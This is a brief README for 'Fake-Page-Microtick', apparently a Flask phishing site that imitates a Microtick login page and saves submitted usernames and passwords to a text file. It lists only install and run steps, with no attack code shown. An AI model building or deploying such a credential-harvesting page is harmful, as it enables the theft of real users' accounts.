# Fake-Page-Microtick

## Setup

Ensure you have python 3.6+ installed.

``
pip install -r requirements.txt
```

## Running the Server

```bash
$ cd website
$ flask run
  * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
```

## Save Username & Password

Username and password are stored in the text "saved.txt"
